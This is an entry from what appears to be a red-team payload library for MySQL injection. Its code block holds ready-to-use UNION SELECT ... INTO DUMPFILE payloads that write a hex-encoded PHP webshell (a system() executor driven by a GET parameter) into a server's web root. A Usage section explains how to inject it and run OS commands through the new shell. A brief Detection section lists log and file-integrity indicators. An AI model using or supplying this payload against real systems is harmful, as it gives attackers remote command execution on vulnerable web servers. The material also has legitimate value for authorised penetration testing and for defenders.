---
id: 156559d7-aba9-4c8a-92aa-5dfb5eeeccdb
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:34.849552+00:00'
updated_at: '2023-04-10T20:22:53.848490+00:00'
tags:
  - '[[tags/MYSQL Injection]]'
  - '[[tags/Into dumpfile method]]'
  - '[[tags/PHP Webshell]]'
platforms:
  - Web
  - Linux
  - Windows
validated: true
---

# MySQL-Dumpfile-PHP-Shell-Payload

## Code

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

## Description

This SQL code snippet exploits a MySQL injection point to write a simple PHP webshell to the server's filesystem using the INTO DUMPFILE clause. The payload is encoded in hexadecimal to evade basic input filters, and the UNION SELECT matches typical query column counts while directing output to a file in the web root. Once executed, the resulting PHP file allows remote command execution via HTTP GET parameters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 0xPHP_PAYLOAD_IN_HEX | Hexadecimal encoding of the PHP shell code (e.g., system command executor) | 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e |
| DUMPFILE path | Target file path in web-accessible directory (must be writable by MySQL process) | '/var/www/html/images/shell.php' or 'C:/Program Files/EasyPHP-12.1/www/shell.php' |
| NULL columns | Placeholder columns to match the original query's SELECT count | NULL, NULL (adjust as needed) |

## Usage

Inject this payload into a vulnerable SQL query parameter during a confirmed SQL injection attack. Replace [...] with the original query prefix and adjust NULLs to match column count. After injection, access the created shell via browser (e.g., http://target/shell.php?c=ls) to execute OS commands. Use in red team exercises for web RCE demonstration or post-exploitation in penetration tests.

## Detection

- Web application logs showing UNION SELECT queries with hex strings or DUMPFILE keywords.
- File integrity monitoring alerting on new PHP files in web directories containing system() calls.
- Database query logs (e.g., MySQL general log) capturing file write attempts.
- Network traffic analysis for HTTP requests to newly created .php files with query parameters like ?c=.

## Related

- [[procedures/MySQL-Dumpfile-PHP-Shell-Creation]]
